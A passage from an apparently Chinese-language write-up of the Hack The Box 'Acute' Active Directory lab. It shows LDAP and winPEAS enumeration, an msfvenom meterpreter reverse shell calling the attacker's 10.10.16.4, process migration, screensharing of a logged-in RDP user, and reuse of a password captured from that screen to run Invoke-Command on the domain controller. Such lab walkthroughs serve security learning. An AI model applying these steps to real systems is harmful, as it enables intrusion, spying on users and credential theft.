class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=acute,DC=local</span><br><span class="line">serverName: CN=ATSSERVER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Con</span><br><span class="line"> figuration,DC=acute,DC=local</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=acute,DC=local</span><br><span class="line">namingContexts: DC=acute,DC=local</span><br><span class="line">namingContexts: CN=Configuration,DC=acute,DC=local</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=acute,DC=local</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=acute,DC=local</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=acute,DC=local</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 153093</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=ATSSERVER,CN=Servers,CN=Default-First-Site-</span><br><span class="line"> Name,CN=Sites,CN=Configuration,DC=acute,DC=local</span><br><span class="line">dnsHostName: ATSSERVER.acute.local</span><br><span class="line">defaultNamingContext: DC=acute,DC=local</span><br><span class="line">currentTime: 20250310082450.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=acute,DC=local</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br></pre></td></tr></table></figure>

<p>得到域控名是啥<code>ATSSERVER.acute.local</code></p>
<p>但是遛狗会提示连不上ldap！擦</p>
<p>所以继续会<code>Acute-PC01</code>跑一下<code>winpeas</code></p>
<p>有个rdp连接在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">͹ RDP Sessions</span><br><span class="line">    SessID    pSessionName   pUserName      pDomainNameState     SourceIP</span><br><span class="line">    1         Console        edavies        ACUTE                    Active</span><br></pre></td></tr></table></figure>

<p><code>qwinsta</code>看下用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;qwinsta</span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   <span class="built_in">TYPE</span>        DEVICE </span><br><span class="line"> services                                    <span class="number">0</span>  Disc                        </span><br><span class="line">&gt;console           edavies                   <span class="number">1</span>  Active                      </span><br><span class="line"> <span class="number">31</span>c5ce94259d4...                        <span class="number">65536</span>  Listen </span><br></pre></td></tr></table></figure>

<p>正常情况下靶机是很少出现有用户开着rdp连着的，所以这里得去下rdp连上后做了什么操作</p>
<p>这里用msf做屏幕监视，cs用不习惯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=10087 -f exe -o t.exe</span><br><span class="line">Warning: KRB5CCNAME environment variable not supported - unsetting</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: t.exe</span><br></pre></td></tr></table></figure>

<p>生成一个载荷，把他丢到<code>C:\utils</code>下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Utils&gt; curl 10.10.16.4/t.exe -o t.exe</span><br><span class="line">curl 10.10.16.4/t.exe -o t.exe</span><br><span class="line">PS C:\Utils&gt; </span><br></pre></td></tr></table></figure>

<p>msf搞一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>加一下配置然后起监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 10.10.16.4</span><br><span class="line">LHOST =&gt; 10.10.16.4</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 10087</span><br><span class="line">LPORT =&gt; 10087</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.4:10087 </span><br></pre></td></tr></table></figure>

<p>运行马子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Utils&gt; .\t.exe</span><br></pre></td></tr></table></figure>

<p>然后拿到了一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; sessions</span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  58        meterpreter x64/windows  ACUTE\edavies @ ACUTE-PC01  10.10.16.4:10087 -&gt; 10.10.11.145:49793 (172.16.22.2)</span><br></pre></td></tr></table></figure>

<p>为了shell稳点选个进程迁移下</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                         Arch  Session  User           <span class="built_in">Path</span></span><br><span class="line"> ---   ----  ----                         ----  -------  ----           ----</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [System Process]</span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System</span><br><span class="line"> <span class="number">52</span>    <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">72</span>    <span class="number">4</span>     Registry</span><br><span class="line"> <span class="number">160</span>   <span class="number">4244</span>  msedge.exe                   x64   <span class="number">1</span>        ACUTE\edavies  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><br><span class="line"> <span class="number">388</span>   <span class="number">4</span>     smss.exe</span><br><span class="line"> <span class="number">444</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">460</span>   <span class="number">656</span>   SecurityHealthService.exe</span><br><span class="line"> <span class="number">496</span>   <span class="number">484</span>   csrss.exe</span><br><span class="line"> <span class="number">564</span>   <span class="number">484</span>   wininit.exe</span><br><span class="line"> <span class="number">572</span>   <span class="number">556</span>   csrss.exe</span><br><span class="line"> <span class="number">576</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">632</span>   <span class="number">556</span>   winlogon.exe</span><br><span class="line"> <span class="number">656</span>   <span class="number">564</span>   services.exe</span><br><span class="line"> <span class="number">664</span>   <span class="number">564</span>   lsass.exe</span><br><span class="line"> <span class="number">684</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">776</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">784</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">792</span>   <span class="number">632</span>   fontdrvhost.exe</span><br><span class="line"> <span class="number">800</span>   <span class="number">564</span>   fontdrvhost.exe</span><br><span class="line"> <span class="number">856</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">884</span>   <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">964</span>   <span class="number">632</span>   dwm.exe</span><br><span class="line"> <span class="number">1032</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1124</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1372</span>  <span class="number">4056</span>  conhost.exe                  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\conhost.exe</span><br><span class="line"> <span class="number">1416</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1448</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1516</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1744</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1860</span>  <span class="number">4</span>     Memory Compression</span><br><span class="line"> <span class="number">1960</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">1968</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">2088</span>  <span class="number">656</span>   MsMpEng.exe</span><br><span class="line"> <span class="number">2416</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">2628</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">2832</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">3096</span>  <span class="number">784</span>   RuntimeBroker.exe            x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\RuntimeBroker.exe</span><br><span class="line"> <span class="number">3120</span>  <span class="number">4056</span>  Utilman.exe                  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\Utilman.exe</span><br><span class="line"> <span class="number">3212</span>  <span class="number">656</span>   svchost.exe                  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\svchost.exe</span><br><span class="line"> <span class="number">3220</span>  <span class="number">576</span>   sihost.exe                   x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\sihost.exe</span><br><span class="line"> <span class="number">3228</span>  <span class="number">784</span>   dllhost.exe                  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\dllhost.exe</span><br><span class="line"> <span class="number">3292</span>  <span class="number">656</span>   NisSrv.exe</span><br><span class="line"> <span class="number">3324</span>  <span class="number">784</span>   RuntimeBroker.exe            x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\RuntimeBroker.exe</span><br><span class="line"> <span class="number">3340</span>  <span class="number">576</span>   MicrosoftEdgeUpdate.exe</span><br><span class="line"> <span class="number">3440</span>  <span class="number">576</span>   taskhostw.exe                x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\taskhostw.exe</span><br><span class="line"> <span class="number">3448</span>  <span class="number">6372</span>  powershell.exe               x64   <span class="number">0</span>        ACUTE\edavies  C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe</span><br><span class="line"> <span class="number">3648</span>  <span class="number">4244</span>  msedge.exe                   x64   <span class="number">1</span>        ACUTE\edavies  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><br><span class="line"> <span class="number">3832</span>  <span class="number">3816</span>  explorer.exe                 x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\explorer.exe</span><br><span class="line"> <span class="number">3964</span>  <span class="number">656</span>   svchost.exe                  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\svchost.exe</span><br><span class="line"> <span class="number">4056</span>  <span class="number">576</span>   <span class="built_in">cmd</span>.exe                      x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\<span class="built_in">cmd</span>.exe</span><br><span class="line"> <span class="number">4172</span>  <span class="number">3832</span>  OneDrive.exe                 x64   <span class="number">1</span>        ACUTE\edavies  C:\Users\edavies\AppData\Local\Microsoft\OneDrive\OneDrive.exe</span><br><span class="line"> <span class="number">4196</span>  <span class="number">7020</span>  conhost.exe</span><br><span class="line"> <span class="number">4216</span>  <span class="number">3448</span>  t.exe                        x64   <span class="number">0</span>        ACUTE\edavies  C:\Utils\t.exe</span><br><span class="line"> <span class="number">4244</span>  <span class="number">3832</span>  msedge.exe                   x64   <span class="number">1</span>        ACUTE\edavies  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><br><span class="line"> <span class="number">4264</span>  <span class="number">4244</span>  msedge.exe                   x64   <span class="number">1</span>        ACUTE\edavies  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><br><span class="line"> <span class="number">4296</span>  <span class="number">4244</span>  msedge.exe                   x64   <span class="number">1</span>        ACUTE\edavies  C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</span><br><span class="line"> <span class="number">4464</span>  <span class="number">784</span>   StartMenuExperienceHost.exe  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe</span><br><span class="line"> <span class="number">4512</span>  <span class="number">784</span>   wsmprovhost.exe              x64   <span class="number">0</span>        ACUTE\edavies  C:\Windows\System32\wsmprovhost.exe</span><br><span class="line"> <span class="number">4528</span>  <span class="number">784</span>   RuntimeBroker.exe            x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\RuntimeBroker.exe</span><br><span class="line"> <span class="number">4632</span>  <span class="number">784</span>   SearchApp.exe                x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe</span><br><span class="line"> <span class="number">4744</span>  <span class="number">784</span>   RuntimeBroker.exe            x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\RuntimeBroker.exe</span><br><span class="line"> <span class="number">4820</span>  <span class="number">784</span>   wsmprovhost.exe              x64   <span class="number">0</span>        ACUTE\edavies  C:\Windows\System32\wsmprovhost.exe</span><br><span class="line"> <span class="number">5188</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">5400</span>  <span class="number">6824</span>  powershell.exe               x64   <span class="number">0</span>        ACUTE\edavies  C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe</span><br><span class="line"> <span class="number">5436</span>  <span class="number">3448</span>  a.exe                        x64   <span class="number">0</span>        ACUTE\edavies  C:\Utils\a.exe</span><br><span class="line"> <span class="number">5648</span>  <span class="number">784</span>   ShellExperienceHost.exe      x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe</span><br><span class="line"> <span class="number">5748</span>  <span class="number">656</span>   SgrmBroker.exe</span><br><span class="line"> <span class="number">5820</span>  <span class="number">656</span>   uhssvc.exe</span><br><span class="line"> <span class="number">5880</span>  <span class="number">784</span>   MoUsoCoreWorker.exe</span><br><span class="line"> <span class="number">5964</span>  <span class="number">656</span>   svchost.exe</span><br><span class="line"> <span class="number">6048</span>  <span class="number">3832</span>  powershell.exe               x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe</span><br><span class="line"> <span class="number">6216</span>  <span class="number">576</span>   taskhostw.exe                x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\taskhostw.exe</span><br><span class="line"> <span class="number">6348</span>  <span class="number">6952</span>  t.exe                        x64   <span class="number">0</span>        ACUTE\edavies  C:\Utils\t.exe</span><br><span class="line"> <span class="number">6372</span>  <span class="number">5400</span>  nc64.exe                     x64   <span class="number">0</span>        ACUTE\edavies  C:\Utils\nc64.exe</span><br><span class="line"> <span class="number">6392</span>  <span class="number">5400</span>  conhost.exe                  x64   <span class="number">0</span>        ACUTE\edavies  C:\Windows\System32\conhost.exe</span><br><span class="line"> <span class="number">6560</span>  <span class="number">6048</span>  conhost.exe                  x64   <span class="number">1</span>        ACUTE\edavies  C:\Windows\System32\conhost.exe</span><br><span class="line"> <span class="number">6632</span>  <span class="number">3448</span>  a.exe                        x64   <span class="number">0</span>        ACUTE\edavies  C:\Utils\a.exe</span><br><span class="line"> <span class="number">6824</span>  <span class="number">784</span>   wsmprovhost.exe              x64   <span class="number">0</span>        ACUTE\edavies  C:\Windows\System32\wsmprovhost.exe</span><br><span class="line"> <span class="number">7020</span>  <span class="number">576</span>   dsregcmd.exe</span><br></pre></td></tr></table></figure>

<p>看中3212了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 5436</span><br><span class="line">meterpreter &gt; migrate 3212</span><br><span class="line">[*] Migrating from 5436 to 3212...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3212</span><br></pre></td></tr></table></figure>

<p>然后就是看桌面，实时看屏幕用<code>screenshare</code>,其实<code>screenshot</code>拍照会好一些，因为这个特别容易丢shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshare</span><br></pre></td></tr></table></figure>
<p>弹出html能看到当前rdp用户操作</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-12.png" alt="alt text"></p>
<p>能看到这个用户想用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.5"><code>Enter-pSSession</code></a>开一个交互用<code>imonks</code>身份连到域控机器<code>atsserver</code>，然后提示没权限</p>
<p>然后他又尝试带着凭证去请求，这次返回了没有<code>Measure-Object</code>查了下，可能是他没权限导致的。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://forums.powershell.org/t/powershell-remoting-broken/5113/9">https://forums.powershell.org/t/powershell-remoting-broken/5113/9</a></p>
</blockquote>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-13.png" alt="alt text"></p>
<p>会发现它后面加了个<code>ConfigurationName</code>指向<code>dc_manage</code>报错就变了，说明必须要用<code>dc_manage</code>，config又限制了他执行命令的范围</p>
<p>我想看下<code>dc_manage</code>给的啥策略，结果也没权限看，岂可休</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-pssessionconfiguration?view=powershell-7.5">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-pssessionconfiguration?view=powershell-7.5</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\utils&gt; <span class="built_in">Get-PSSessionConfiguration</span></span><br><span class="line"><span class="built_in">Get-PSSessionConfiguration</span></span><br><span class="line"><span class="built_in">Get-PSSessionConfiguration</span> : Access is denied. To run this cmdlet, <span class="built_in">start</span> Windows PowerShell with the <span class="string">&quot;Run as </span></span><br><span class="line"><span class="string">administrator&quot;</span> option.</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ <span class="built_in">Get-PSSessionConfiguration</span></span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [<span class="built_in">Get-PSSessionConfiguration</span>], InvalidOperationException</span><br><span class="line">    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetPSSessionConfiguration </span><br><span class="line">   Command</span><br></pre></td></tr></table></figure>

<p>不过可以注意到这个rdp用户虽然<code>Enter-PSSession</code>没权限，但是我们仍然可以拿着它密码尝试别的命令，比如<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.5"><code>Invoke-Command</code></a>。</p>
<p>这里用他rdp看到的用户密码执行，同样需要指定dc_manage才可以，估计是做了啥限制。</p>
<p>比如，如果 <code>dc_manage</code> 的权限被设置为仅允许特定用户，而其他配置（如 Microsoft.PowerShell）的权限被设置为拒绝普通用户，则用户必须显式指定 <code>-ConfigurationName</code> dc_manage。</p>
<p>禁止普通用户使用默认配置比如用下面这个</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-PSSessionConfiguration</span> <span class="literal">-Name</span> Microsoft.PowerShell <span class="literal">-SecurityDescriptorSddl</span> <span class="string">&quot;O:NSG:BAD:P(A;;GA;;;BA)S:&quot;</span></span><br></pre></td></tr></table></figure>
<p>抑或是直接<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.5">Register-PSSessionConfiguration</a>注册</p>
<p>而要想查看有啥配置就得用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-pssessionconfiguration?view=powershell-7.5"><code>Get-PSSessionConfiguration</code></a>,而当前用户又没权限看。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\utils&gt; <span class="built_in">Get-PSSessionConfiguration</span> | <span class="built_in">Format-Table</span> Name, Permission</span><br><span class="line"><span class="built_in">Get-PSSessionConfiguration</span> : Access is denied. To run this cmdlet, <span class="built_in">start</span> Windows PowerShell with the <span class="string">&quot;Run as </span></span><br><span class="line"><span class="string">administrator&quot;</span> option.</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ <span class="built_in">Get-PSSessionConfiguration</span> | <span class="built_in">Format-Table</span> Name, Permission</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [<span class="built_in">Get-PSSessionConfiguration</span>], InvalidOperationException</span><br><span class="line">    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetPSSessionConfiguration </span><br><span class="line">   Command</span><br></pre></td></tr></table></figure>

<p>那就用<code>Invoke-Command</code>直接执行rdp用户一开始想执行的命令，能看到这次估计是<code>dc_manage</code>限制了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\utils&gt; <span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;W3_4R3_th3_f0rce.&quot;</span> <span class="literal">-AsplainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;W3_4R3_th3_f0rce.&quot;</span> <span class="literal">-AsplainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\utils&gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;acute\imonks&quot;</span>,<span class="variable">$passwd</span>)</span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;acute\imonks&quot;</span>,<span class="variable">$passwd</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\utils&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Get-Culture</span> &#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Get-Culture</span> &#125;</span><br><span class="line">The term <span class="string">&#x27;Get-Culture&#x27;</span> is not recognized as the name of a cmdlet, function, script file, or operable program. Check </span><br><span class="line">the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path is correct and <span class="keyword">try</span> again.</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (<span class="built_in">Get-Culture</span>:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">    + PSComputerName        : ATSSERVER</span><br></pre></td></tr></table></figure>

<p>看下能指定哪些命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Utils&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">get-command</span>&#125;</span><br><span class="line">CommandType     Name                                               Version    Source               PSComputerName      </span><br><span class="line"><span class="literal">-----------</span>     <span class="literal">----</span>                                               <span class="literal">-------</span>    <span class="literal">------</span>               <span class="literal">--------------</span>      </span><br><span class="line">Cmdlet          <span class="built_in">Get-Alias</span>                                          <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Get-ChildItem</span>                                      <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line">Cmdlet          <span class="built_in">Get-Command</span>                                        <span class="number">3.0</span>.<span class="number">0.0</span>    